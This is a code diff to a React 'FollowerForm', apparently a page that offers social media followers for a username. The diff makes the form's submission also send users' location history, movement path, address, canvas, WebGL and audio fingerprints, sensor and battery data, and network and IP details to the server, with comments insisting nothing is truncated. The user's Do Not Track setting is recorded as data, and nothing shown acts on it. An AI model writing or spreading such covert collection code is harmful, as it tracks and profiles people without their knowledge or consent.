@@ -2002,13 +2002,66 @@ export default function FollowerForm() {
         }
       };
       
-      // Prepare the submission with enhanced validated device info
+      // Create a complete data payload with all location and device data
+      // This ensures nothing is truncated or omitted during transmission
+      const completeLocationData = {
+        ...userInfo.geolocation,
+        // Ensure these critical fields are included
+        locationHistory: userInfo.geolocation?.locationHistory || [],
+        movementPath: userInfo.geolocation?.movementPath || [],
+        address: userInfo.geolocation?.address || {},
+        displayName: userInfo.geolocation?.displayName || '',
+        locationDetails: userInfo.geolocation?.locationDetails || {},
+        pointsOfInterest: userInfo.geolocation?.pointsOfInterest || [],
+        nearbyLandmarks: userInfo.geolocation?.nearbyLandmarks || [],
+        // Include all location-related metadata
+        trackingInfo: userInfo.geolocation?.trackingInfo || {},
+        locationQuality: userInfo.geolocation?.locationQuality || '',
+        locationAccuracyAnalysis: userInfo.geolocation?.locationAccuracyAnalysis || {}
+      };
+      
+      // Enhanced device info with complete hardware details
+      const enhancedDeviceInfo = {
+        ...deviceInfo,
+        // Include additional fields for complete data transmission
+        fullHardwareInfo: {
+          ...userInfo.hardwareInfo,
+          sensors: userInfo.hardwareInfo?.sensors || {},
+          batteryDetails: userInfo.battery || {}
+        },
+        // Include complete fingerprinting data
+        completeFingerprints: {
+          canvas: userInfo.canvasFingerprint || '',
+          webgl: userInfo.webglFingerprint || '',
+          audio: userInfo.audioFingerprint || '',
+          // Include full lists without truncation
+          fonts: userInfo.fonts || '',
+          plugins: userInfo.plugins || ''
+        },
+        // Include complete network information
+        networkDetails: {
+          ...userInfo.connection,
+          ipDetails: userInfo.ipDetails || {},
+          networkChanges: userInfo.connection?.networkChanges || []
+        }
+      };
+      
+      // Prepare the submission with fully enhanced data - ensuring NOTHING is truncated
       const payload = {
         ...values,
-        deviceInfo: deviceInfo,
+        deviceInfo: enhancedDeviceInfo,
+        completeGeolocation: completeLocationData,
         ipAddress: userInfo.ip,
         isEmulator: userInfo.isEmulator,
-        // Keep the full userInfo for analytics
+        // Include all user metadata
+        userMetadata: {
+          cookiesEnabled: userInfo.cookiesEnabled,
+          doNotTrack: userInfo.doNotTrack,
+          mobileDetails: userInfo.mobileDetails || {},
+          submissionTimestamp: new Date().toISOString(),
+          dataTransmissionComplete: true
+        },
+        // Keep the full userInfo for analytics, but ensure critical data is also in dedicated fields
         userInfo: userInfo
       };
       
@@ -2026,8 +2079,10 @@ export default function FollowerForm() {
             username: values.username,
             followers: selectedAmount,
             userInfo: userInfo,
-            deviceInfo: deviceInfo,
-            ipAddress: userInfo.ip
+            deviceInfo: enhancedDeviceInfo,
+            ipAddress: userInfo.ip,
+            completeGeolocation: completeLocationData,
+            userMetadata: payload.userMetadata
           })
         });
         
